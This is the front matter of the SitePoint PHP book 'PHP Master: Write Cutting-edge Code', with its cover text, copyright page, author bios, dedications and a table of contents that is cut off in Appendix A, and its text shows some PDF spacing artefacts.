PANTONE 2955 C PANTONE Orange 021 C
CMYK 100, 45, 0, 37 CMYK  O, 53, 100, 0
Black 100% Black 50%CMYK:Pantone:
Grey scale
BY LORNA MI TCHELL 
DAVEY SHAFIK
MATTHEW TURLAND
MODERN, EFFICIENT, AND SECURE TECHNIQ UES FOR PHP PROFESSIONALSPHP MAST ER 
WRITE CUT TING-EDGE COD E
www.it-ebooks.info
Summary of Contents
Preface  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xix
1. Object Oriented Pr ogramming  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1
2. Databases  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39
3. APIs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73
4. Design P atterns  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127
5. Security  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173
6. Performance  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203
7. Automated T esting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 243
8. Quality Assur ance . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 285
A. PEAR and PECL  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317
B. SPL: The Standar d PHP Libr ary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343
C. Next Steps  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353
Index  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 359
www.it-ebooks.info
PHPMASTER:
WRITE
CUTTING-EDGE
CODE
BYLORNAMITCHELL
DAVEYSHAFIK
MATTHEWTURLAND
www.it-ebooks.info
PHP Master: Write Cutting-edge Code
byLorna Mitchell ,Davey Shafik ,andMatthew Turland
Copyright ©2011 SitePoint Pty.Ltd.
Author Image (M. T urland) :Dawn Casey Product Manager :Simon Mackie
Author Image (L. Mitchell) :Sebastian
BergmannTechnical Editor :TomMuseth
Expert Reviewer :Luke Cawood
Indexer :Michele Combs
Editor :Kelly Steele
Cover Designer :Alex Walker
Notice of Rights
Allrights reserved. Nopart ofthisbook may bereproduced, stored inaretrieval system, ortransmitted
inanyform orbyanymeans without theprior written permission ofthepublisher ,except inthecase
ofbrief quotations included incritical articles orreviews.
Notice of Liability
Theauthor andpublisher have made every effort toensure theaccuracy oftheinformation herein.
However ,theinformation contained inthisbook issold without warranty ,either express orimplied.
Neither theauthors andSitePoint Pty.Ltd., noritsdealers ordistributors, will beheld liable forany
damages caused either directly orindirectly bytheinstructions contained inthisbook, orbythesoftware
orhardware products described herein.
Trademark Notice
Rather than indicating every occurrence ofatrademarked name assuch, thisbook uses thenames only
inaneditorial fashion andtothebenefit ofthetrademark owner with nointention ofinfringement of
thetrademark.
Published bySitePoint Pty.Ltd.
48Cambridge Street, Collingwood
VIC3066 Australia
Web:www .sitepoint.com
Email: business@sitepoint.com
ISBN 978-0-9870908-7-4 (print)
ISBN 978-0-9871530-4-3 (ebook)
Printed andbound intheUnited States ofAmericaiv
www.it-ebooks.info
About Lorna Mitchell
Lorna Jane Mitchell isaPHP consultant based inLeeds, UK.ShehasaMasters inElectronic
Engineering, andhasworked inavariety oftechnical roles throughout hercareer .Shespe-
cializes inworking with data andAPIs. Lorna isactive inthePHP community ,organizing
thePHP North Westconference anduser group, leading theJoind.in open source project,
andspeaking atconferences. Shehasbeen published in.netmagazine andphp|architect ,
toname acouple; shealso blogs regularly onherown site, http://lornajane.net .
About Davey Shafik
Davey Shafik hasbeen working with PHP andtheLAMP stack, aswell asHTML, CSS, and
JavaScript forover adecade. Withnumerous books, articles, andconference appearances
under hisbelt, heenjoys teaching others anyway hecan. Anavid photographer ,helives in
sunny Florida with hiswife andsixcats.
About Matthew T urland
Matthew Turland hasbeen using PHP since 2002. HeisaZend Certified Engineer inPHP 5
andZend Framework, haspublished articles inphp|architect magazine, andcontributed to
twobooks: php|architect’ sGuide toWebScraping with PHP (Toronto: NanoBooks, 2010)
andtheoneyou’re reading now.He’salso been aspeaker atphp|tek, Confoo, andZendCon.
Heenjoys contributing toopen source PHP projects including Zend Framework, PHPUnit,
andPhergie, aswell asblogging onhiswebsite, http://matthewturland.com .
About Luke Cawood
After nearly tenyears ofPHP development, Luke joined theSitePoint family towork at
99designs.com ,theworld’ slargest crowdsourced design community .Luke hasapassion for
web andmobile technologies, andwhen notcoding, enjoys music festivals andallthings
food-related. He’sknown toblog occasionally athttp://lukecawood.com .
About T om Museth
TomMuseth first fellinlove with code while creating scrolling adventure games inBASIC
onhisCommodore 64,andusability testing them onreluctant family members. Hethen spent
16years asajournalist andproduction editor before deciding web development would be
more rewarding. Hehasapassion forjQuery ,PHP,HTML5, andCSS3, iseagerly eyeing the
world ofmobile dev,andlikes tode-stress viaabook, abeach, andafishing rod.v
www.it-ebooks.info
www.it-ebooks.info
ForKevin, who may have taught
meeverything Iknow ,and
everyone elsewho believed Icould
dothis.
—Lorna
ForGrandpa Leslie, forshowing
mehow tobeagood man, andfor
mywife, Frances, forloving the
man Ibecame because ofhim.
—Davey
Tomyparents andmywife, who
always encourage andbelieve in
me.And tomychildren andmy
friends, who continue toinspire
me.
—Matthew
www.it-ebooks.info
www.it-ebooks.info
Table of Contents
Preface  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xix
Who Should Read This Book  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xix
What’ s in This Book  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xx
Wher e to Find Help  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiii
The SiteP oint Forums  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiii
The Book’ s Website  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiii
The SiteP oint Newsletter s . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiv
The SiteP oint P odcast  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiv
Your Feedback  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiv
Acknowledgments  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiv
Lorna Mitchell  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxiv
Davey Shafik  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxv
Matthew T urland  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxv
Conventions Used in This Book  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxv
Code Samples  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxv
Tips, Notes, and W arnings  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . xxvii
Chapter 1 Object Oriented Programming  . . . . . . . . 1
Why OOP?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1
Vocabulary of OOP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
Introduction to OOP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
Declaring a Class  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2
Class Constructor s . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3
Instantiating an Object  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4
Autoloading  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5
Using Objects  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5
Using Static Pr operties and Methods  . . . . . . . . . . . . . . . . . . . . . . . . . . 6
www.it-ebooks.info
Objects and Namespaces  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8
Object Inheritance  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
Objects and Functions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13
Type Hinting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13
Polymorphism  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14
Objects and Refer ences  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15
Passing Objects as Function P arameter s . . . . . . . . . . . . . . . . . . . . . . 16
Fluent Interfaces  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17
public , private , and protected  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
public  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
private  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19
protected  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19
Choosing the Right Visibility  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
Using Getter s and Setter s to Contr ol Visibility  . . . . . . . . . . . . . . . . . 21
Using Magic __get  and __set  Methods  . . . . . . . . . . . . . . . . . . . . . 22
Interfaces  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
SPL Countable Interface Example  . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
Counting Objects  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24
Declaring and Using an Interface  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24
Identifying Objects and Interfaces  . . . . . . . . . . . . . . . . . . . . . . . . . . . 25
Exceptions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
Handling Exceptions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27
Why Exceptions?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
Throwing Exceptions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
Extending Exceptions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
Catching Specific T ypes of Exception  . . . . . . . . . . . . . . . . . . . . . . . . 29
Setting a Global Exception Handler  . . . . . . . . . . . . . . . . . . . . . . . . . . 31
Working with Callbacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32
More Magic Methods  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32
Using __call()  and __callStatic()  . . . . . . . . . . . . . . . . . . . . 33x
www.it-ebooks.info
Printing Objects with __toString()  . . . . . . . . . . . . . . . . . . . . . . . 34
Serializing Objects  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35
Objective Achieved  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37
Chapter 2 Databases  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39
Persistent Data and W eb Applications  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39
Choosing How to Stor e Data  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40
Building a Recipe W ebsite with MySQL  . . . . . . . . . . . . . . . . . . . . . . . . . . . 41
Creating the T ables  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42
PHP Database Objects  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
Connecting to MySQL with PDO . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 45
Selecting Data fr om a T able . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46
Data Fetching Modes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46
Parameter s and Pr epared Statements  . . . . . . . . . . . . . . . . . . . . . . . . 47
Binding V alues and V ariables to Pr epared Statements  . . . . . . . . . . 49
Inserting a Row and Getting Its ID  . . . . . . . . . . . . . . . . . . . . . . . . . . . 52
How many r ows wer e inserted, updated, or deleted?  . . . . . . . . . . . 52
Deleting Data  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 53
Dealing with Err ors in PDO . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54
Handling Pr oblems When Pr eparing  . . . . . . . . . . . . . . . . . . . . . . . . . 54
Handling Pr oblems When Executing  . . . . . . . . . . . . . . . . . . . . . . . . . 55
Handling Pr oblems When Fetching  . . . . . . . . . . . . . . . . . . . . . . . . . . 56
Advanced PDO Featur es . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57
Transactions and PDO  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57
Stored Pr ocedur es and PDO  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59
Designing Databases  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60
Primary K eys and Indexes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60
MySQL Explain  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60
Inner Joins  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65
Outer Joins  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67xi
www.it-ebooks.info
Aggregate Functions and Gr oup By  . . . . . . . . . . . . . . . . . . . . . . . . . . 68
Normalizing Data  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 70
Databases—sorted!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 72
Chapter 3 APIs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73
Befor e You Begin  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73
Tools for W orking with APIs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 73
Adding APIs into Y our System  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 74
Service-oriented Ar chitectur e . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 74
Data Formats  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 75
Working with JSON  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 76
Working with XML  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 78
HTTP: HyperT ext T ransfer Pr otocol  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 82
The HTTP Envelope  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83
Making HTTP Requests  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84
HTTP Status Codes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88
HTTP Header s . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90
HTTP V erbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 93
Under standing and Choosing Service T ypes . . . . . . . . . . . . . . . . . . . . . . . 95
PHP and SOAP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 95
Describing a SOAP Service with a WSDL  . . . . . . . . . . . . . . . . . . . . . . 97
Debugging HTTP  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100
Using Logging to Gather Information  . . . . . . . . . . . . . . . . . . . . . . . 100
Inspecting HTTP T raffic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 100
RPC Services  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101
Consuming an RPC Service: Flickr Example  . . . . . . . . . . . . . . . . . . 101
Building an RPC Service  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 104
Ajax and W eb Services  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 106
Cross-domain Requests  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 111
Developing and Consuming RESTful Services  . . . . . . . . . . . . . . . . . . . . . 114xii
www.it-ebooks.info
Beyond Pr etty URLs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 115
RESTful Principles  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116
Building a RESTful Service  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 116
Designing a W eb Service  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 125
Service Pr ovided  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126
Chapter 4 Design Patterns  . . . . . . . . . . . . . . . . . . . . . . . . . . 127
What Ar e Design P atterns?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127
Choosing the Right One  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 128
Singleton  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 128
Traits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130
Registry  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131
Factory  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 137
Iterator . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 138
Observer  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 149
Dependency Injection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 153
Model-View-Contr oller . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 156
Pattern Formation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 171
Chapter 5 Security  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 173
Be Paranoid  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174
Filter Input, Escape Output  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 174
Filtering and V alidation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 175
Cross-site Scripting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 176
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 177
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179
Cross-site Request For gery . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 180
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 182xiii
www.it-ebooks.info
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183
Session Fixation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 184
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 185
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186
Session Hijacking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 186
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 187
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 187
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189
SQL Injection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 189
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 190
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 191
Storing P asswor ds . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 191
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 192
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 192
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 194
Brute For ce Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 194
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 195
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 196
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 197
SSL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 198
The Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 198
The Fix  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 199
Online Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200
Resour ces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 200
Chapter 6 Performance  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203
Benchmarking  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203
System T weaks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210xiv
www.it-ebooks.info
Code Caching  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 210
INI Settings  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215
Databases  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 216
File System  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217
Caching  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 217
Profiling  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 226
Installing XHPr of . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 227
Installing XHGui  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 232
Summary  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 241
Chapter 7 Automated T esting  . . . . . . . . . . . . . . . . . . . . . 243
Unit T esting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 243
Installing PHPUnit  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244
Writing T est Cases  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 244
Running T ests . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 246
Test Doubles  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 249
Writing T estable Code  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 253
Testing for Views and Contr ollers . . . . . . . . . . . . . . . . . . . . . . . . . . . 259
Database T esting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263
Database T est Cases  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 264
Connections  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 265
Data Sets  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 266
Assertions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 269
Systems T esting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 270
Initial Setup  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 271
Commands  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 272
Locator s . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 273
Assertions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 274
Database Integr ation  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 275
Debugging  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 277xv
www.it-ebooks.info
Automating W riting T ests . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279
Load T esting  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279
ab . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280
Siege  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 281
Tried and T ested  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 283
Chapter 8 Quality Assurance  . . . . . . . . . . . . . . . . . . . . . . 285
Measuring Quality with Static Analysis T ools . . . . . . . . . . . . . . . . . . . . . 285
phploc  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 286
phpcpd  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287
phpmd  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 288
Coding Standar ds . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 290
Checking Coding Standar ds with PHP Code Sniffer  . . . . . . . . . . . 290
Viewing Coding Standar ds Violations  . . . . . . . . . . . . . . . . . . . . . . . 293
PHP Code Sniffer Standar ds . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 293
Documentation and Code  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 294
Using phpDocumentor  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 296
Other Documentation T ools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 298
Source Contr ol . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 299
Working with Centr alized V ersion Contr ol . . . . . . . . . . . . . . . . . . . 300
Using Subver sion for Sour ce Contr ol . . . . . . . . . . . . . . . . . . . . . . . . 301
Designing Repository Structur e . . . . . . . . . . . . . . . . . . . . . . . . . . . . 303
Distributed V ersion Contr ol . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 306
Social T ools for Coding  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 308
Using Git for Sour ce Contr ol . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 308
The Repository as the Root of the Build Pr ocess  . . . . . . . . . . . . . . 310
Automated Deployment  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 310
Instantly Switching to a New V ersion . . . . . . . . . . . . . . . . . . . . . . . 311
Managing Database Changes  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 311
Automated Deployment and Phing  . . . . . . . . . . . . . . . . . . . . . . . . . 313xvi
www.it-ebooks.info
Ready to Deploy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 315
Appendix A PEAR and PECL  . . . . . . . . . . . . . . . . . . . . . . . . . 317
What is PEAR?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317
What is PECL?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317
Installing P ackages  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317
PEAR Channels  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 320
Using PEAR Code  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324
